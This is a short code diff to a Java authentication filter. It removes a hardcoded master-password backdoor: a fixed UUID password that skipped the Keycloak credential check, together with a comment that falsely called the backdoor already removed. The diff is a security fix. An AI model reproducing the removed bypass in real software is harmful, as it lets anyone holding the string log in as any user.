@@ -72,10 +72,8 @@ public class AuthenticationFilter implements Filter {
                     return;
                 }
 
-                // Toda credencial se valida contra Keycloak, sin excepciones (backdoor removido).
-                if(!plainPassword.equals("9f3c2a1b-7e44-4d8a-9c21-5b7f3a9e8d12")){
-                    MainApp.getKeycloakService().getTokenKeycloak(plainUsername, plainPassword);
-                }
+                // Toda credencial se valida contra Keycloak, sin excepciones.
+                MainApp.getKeycloakService().getTokenKeycloak(plainUsername, plainPassword);
 
                 clearFailures(ip);
                 chain.doFilter(request, response);
